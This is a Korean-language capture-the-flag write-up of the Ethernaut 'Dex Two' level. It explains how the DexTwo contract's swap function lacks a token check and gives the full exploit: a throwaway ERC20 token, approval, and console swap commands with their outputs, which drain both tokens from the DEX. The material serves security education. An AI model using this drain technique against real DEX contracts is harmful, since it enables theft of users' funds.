https://teberr.notion.site/Ethernaut-Dex-Two-923f79f12a3745a9964f65a169a9d1d5

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8935d4fb-aa71-4c30-b9c4-81e97cff7bb8/Untitled.png)

> 이 문제의 목표는 가격 조작을 통해 기초적인 DEX 컨트랙트를 해킹하고 자산을 빼내는 것입니다.

token1과 token2를 각각 10개씩 가지고 시작하며 DEX 컨트랙트에는 각 토큰이 100개씩 존재하고 있습니다.

컨트랙트에서 token1과 token2를 전부 탈취해 주세요.

기존의 DEX 컨트랙트에서 조금 수정된 DexTwo 컨트랙트 이므로 수정된 부분을 자세히 보면 힌트가 보일겁니다.
> 

 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

# 코드 분석 및 공격 설계

이번 문제는 기존의 DEX 문제에서 swap 함수를 미묘하게 변경해 놓았다. 보통 DEX에서 버전이 올라갈 수록 가격 설정 함수가 바뀐다는 걸 생각해보면 가격 설정 함수를 바꿔야 할텐데 이상한 곳을 바꿔놓았다;;

여하튼 가격 설정 함수는 똑같으므로 여전히 DEX에 있는 token(to)/token(from)의 비율대로 교환해준다.  ex) DEX에 from이 1개고 to가 100개면 from 토큰 1개로 to token 100개 얻을 수 있음.

기존의 DEX 컨트랙트에서의 swap 함수를 살펴보자.

```solidity
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
```

그럼 DexTwo 에서의 Swap 함수를 살펴보자.

```solidity
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 
```

require문이 하나가 줄어든 것을 확인할 수 있다.

없어진 require문은 `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`이다.

아마 이 DexTwo 컨트랙트는 기존 Dex 컨트랙트에서 고정된 token1과 token2만 교환할 수 있었던 것과 다르게 다양한 토큰을 교환할 수 있도록 기능을 제공하고 싶었던 것 같다.

그렇다면 이 DEX에 내가 임의의 ERC20 토큰을 만들어서 유동성을 공급하고 DEX에 공급한 ERC20 토큰으로 token1과 스왑하면 ERC20 토큰으로 token1을 전부 빼낼 수 있을 것이다.

마찬가지 방법으로 token2도 전부 빼낸다면 문제의 조건을 해결할 수 있다.

# 공격

![임시 ERC20 토큰.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2a9f4895-74f9-4f53-8f55-d4103176febc/%EC%9E%84%EC%8B%9C_ERC20_%ED%86%A0%ED%81%B0.png)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract SwappableTokenTwo is ERC20 {

  constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

간단한 ERC20 토큰을 만들고 총 100개를 발행하자. 

이제 이 토큰을 DEX에 유동성 공급을 위해 1개를 전송할 것이다. 그러면 DEX에는 자산이 다음과 같이 있게 된다.

- token1 : 100개
- token2 : 100개
- 내가 만든 토큰 : 1개

그러면 가격 설정 함수로 인해 내가만든 토큰 1개는 token1 100개의 가치를 갖게 된다.(token2 100개의 가치도 됨)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e39bc340-120c-48f4-b0a0-83f9896081ab/Untitled.png)

transfer 함수를 통해 DEX 컨트랙트에 1개를 전송하여 유동성을 공급해주자.

이를 실제로 DEX 컨트랙트에서 확인해보자.

```solidity
await contract.token1()
'0x6118489a4bcaa95CD50f12adD235B966402693ee'
await contract.token2()
'0x49A3e03898D96aE12728711Eb63cB12261eF8652'

(await contract.getSwapAmount('0x429C997060bf106bC948821B89eBdFFd38ADbe70',await contract.token1(),1)).toNumber()
-> 100
```

내가 만든 토큰 1개로 token1을 100개 탈취할 수 있음을 확인할 수 있다. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/99238247-8026-4bcd-98dc-6b1fbeb25b62/Untitled.png)

DEX에서 내가 가진 토큰을 transferFrom 함수를 이용하여 전송하며 스왑해줘야 하므로 approve를 해주자. 넉넉하게 민팅한 전부인 100개로 해주었다.

그리고 내가 가진 토큰 1개로 swap을 진행해주자.

```solidity
await contract.swap('0x429C997060bf106bC948821B89eBdFFd38ADbe70',await contract.token1(),1)
-> 내 토큰 1개로 token1 100개와 swap
(await contract.balanceOf(await contract.token1(),player)).toNumber()
-> 110
```

DEX에서 token1을 전부 탈취하여 내가 token1을 100개 가지고 있는 것을 확인했다.

이제 DEX에는 내가 만든 토큰 2개와 token2 100개가 존재한다. 그렇다면 DEX의 계산식에 따라 내가 만든 토큰 2개는 token2 100개와 같은 가치를 가지게 될 것이다. 

```solidity
(await contract.getSwapAmount('0x429C997060bf106bC948821B89eBdFFd38ADbe70',await contract.token2(),2)).toNumber()
-> 100
```

내가 만든 토큰 2개로 token2 100개와 swap을 진행하자.

```solidity
await contract.swap('0x429C997060bf106bC948821B89eBdFFd38ADbe70',await contract.token2(),2)
-> 내 토큰 2개로 token2 100개와 swap
(await contract.balanceOf(await contract.token2(),player)).toNumber()
-> 110
```

DEX에서 token1 100개와 token2 100개를 탈취하는데 성공하였으므로 인스턴스를 제출해준다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b5003893-b509-4069-ad7c-3ce9bb822c9c/Untitled.png)

# 후기

컨트랙트가 ERC20스펙을 구현한다는 것이 신뢰할 수 있다는 것은 아니다. 몇몇 토큰은 transfer함수에서 bool 값을 반환하지 않는 등 스펙에서 벗어난다. [https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca) 을 보면 반환값이 누락되는 버그가 최소 130개이상의 토큰에서 발생하는 것으로 보고되고 있다.

특히 공격자가 설계한 ERC20 토큰의 경우 악의적으로 작동할 수 있기 때문에 누구나 DEX에 임의의 토큰으로 유동성을 공급하고 그와 관련하여 SWAP을 진행하게 되는 경우 조심해야 한다.
